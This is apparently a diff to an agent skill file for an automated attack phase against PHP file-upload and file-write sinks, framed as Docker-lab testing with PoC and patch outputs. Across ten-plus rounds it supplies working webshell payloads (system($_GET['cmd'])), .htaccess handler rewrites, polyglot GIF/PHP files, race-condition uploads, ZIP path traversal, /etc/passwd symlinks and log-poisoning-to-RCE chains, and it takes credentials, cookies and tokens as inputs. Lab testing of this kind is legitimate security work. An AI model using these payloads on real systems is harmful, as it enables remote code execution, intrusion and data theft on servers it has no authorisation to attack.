@@ -2,7 +2,34 @@
 > **Input**: attack_plans/{sink_id}_plan.json, Docker container access
 > **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py
 
+
+## Identity
+
+| Field | Value |
+|-------|-------|
+| Skill ID | S-044-B |
+| Phase | Phase-4 (Attack) |
+| Responsibility | Execute progressive multi-round attack against File Write / Upload sinks |
+
+## Input Contract
+
+| File | Source | Required | Fields Used |
+|------|--------|----------|-------------|
+| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
+| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
+| Container | Docker `php` container | ✅ | `exec` access |
+
 ## 8-Round Attack
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R1 - Direct PHP Webshell Write
 
@@ -13,6 +40,16 @@ Payload:
 - Content: `<?php echo "WRITE_PROOF"; system($_GET['cmd']); ?>`
 
 Test all parameters that control the output filename in file_put_contents, fwrite, or move_uploaded_file. Try absolute paths (`/var/www/html/shell_proof.php`) and relative paths (`../../shell_proof.php`).
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R2 - Encoded Filename Bypass
 
@@ -26,6 +63,16 @@ Payload:
 
 Target filters that use `pathinfo()` or regex-based extension matching. Confirm whether the file is created on disk with a .php extension.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R3 - .htaccess Modification
 
 Goal: Modify .htaccess to allow non-PHP files to execute as PHP.
@@ -35,6 +82,16 @@ Payload:
 - Or: `<FilesMatch "\.jpg$">\nSetHandler application/x-httpd-php\n</FilesMatch>`
 
 Then upload `shell_proof.jpg` containing PHP code. Confirmed if the server processes it as PHP.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R4 - Double Extension & MIME Confusion
 
@@ -47,6 +104,16 @@ Payload:
 
 Also test MIME type mismatch: set Content-Type to `image/jpeg` but upload PHP content. Determine whether the server validates content against headers.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R5 - Case Variation & Alternative Extension Bypass
 
 Goal: Exploit case-insensitive handling or alternative extension processing.
@@ -57,6 +124,16 @@ Payload:
 - `.php3`, `.php4`, `.inc`
 
 Test each variant against upload filters. On Linux, filenames are case-sensitive, but Apache/PHP configuration may accept all variants.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R6 - Image Polyglot File (GIF89a + PHP)
 
@@ -69,6 +146,16 @@ Payload:
 - Prepend valid BMP header before PHP code
 
 Can bypass `getimagesize()`, `mime_content_type()`, and `finfo_file()` analysis. Combine with R3 (.htaccess) to execute images as PHP.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R7 - Race Condition Upload
 
@@ -87,6 +174,16 @@ Upload file payload:
 
 Use 50-100 concurrent threads for both upload and access.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R8 - ZIP Path Traversal & Combination Attack
 
 Goal: Exploit ZipArchive::extractTo to write files outside the target directory.
@@ -102,6 +199,16 @@ Combination variants:
 3. Accessing shell.txt executes as PHP
 
 Also test: symlinks in ZIP pointing to `/etc/passwd`, tar path traversal (if tar extraction is used).
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R9 - ImageMagick / GD Library Exploitation
 
@@ -121,6 +228,16 @@ Goal: Achieve file write or command execution through image processing libraries
   - Embed PHP webshell in IDAT chunk
   - MUST bypass `imagecopyresampled()` and similar processing
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R10 - Log File Write → RCE
 
 Goal: Write malicious code via controllable log content.
@@ -133,6 +250,16 @@ Goal: Write malicious code via controllable log content.
   2. The exception is written to the log file
   3. Include the log file via LFI → RCE
 - Log rotation exploitation: `laravel-2024-01-01.log` has a predictable filename
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R11 - Temporary File Exploitation
 
@@ -616,6 +743,64 @@ Python caches compiled bytecode as `.pyc` files (located in the `__pycache__/` d
 
 > The attack surface of hybrid-language projects for file write vulnerabilities is far larger than single-language projects. PHP file write vulnerabilities can not only write Webshells but also affect Python/Ruby components through .so/.pyc overwriting. Defense requires unified cross-language file integrity monitoring, with particular attention to write protection for runtime dependency directories such as `__pycache__/`, `$LOAD_PATH`, and `node_modules/`.
 
+
+
+## Output Contract
+
+| Output File | Path | Description |
+|-------------|------|-------------|
+| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
+| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
+| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |
+
+## Examples
+
+### ✅ GOOD Example — Complete, Valid Exploit Result
+
+```json
+{
+  "sink_id": "upload_avatar_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 4,
+  "successful_round": 2,
+  "payload": "shell.php.jpg with GIF89a header + <?php system($_GET['c']);?>",
+  "evidence_result": "Uploaded file accessible at /uploads/shell.php.jpg, executed phpinfo() via GET ?c=phpinfo()",
+  "severity": {
+    "level": "C",
+    "score": 2.7,
+    "cvss": 9.0
+  }
+}
+```
+
+**Why this is good:**
+- `evidence_result` contains specific, verifiable proof of exploitation
+- `severity` scoring is consistent: score 2.7 → cvss 9.0 → level `C`
+- `rounds_executed` shows progressive effort, not a single blind attempt
+- All required fields are populated with concrete values
+
+### ❌ BAD Example — Incomplete, Invalid Exploit Result
+
+```json
+{
+  "sink_id": "upload_avatar_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 1,
+  "successful_round": 1,
+  "payload": "shell.php",
+  "evidence_result": "",
+  "failure_reason": "",
+  "severity": {
+    "level": "H",
+    "score": null
+  }
+}
+```
+
+**Issues:**
+- evidence_result is empty — no proof that uploaded file is accessible or executable
+- failure_reason is empty — no upload response or access URL documented
+- severity_level 'H' for webshell upload with RCE — should be C
 
 ---
 
